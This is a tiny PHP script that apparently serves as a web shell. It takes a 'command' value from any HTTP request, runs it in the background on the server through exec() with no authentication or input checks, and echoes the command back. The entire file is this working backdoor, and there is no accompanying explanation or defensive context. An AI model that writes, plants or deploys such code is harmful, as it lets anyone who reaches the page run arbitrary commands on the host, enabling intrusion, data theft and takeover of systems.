<?php

$E = "nohup ".$_REQUEST["command"]." >/dev/null 2>/dev/null &";
exec($E);	
	

echo "ok: ".$E;
?>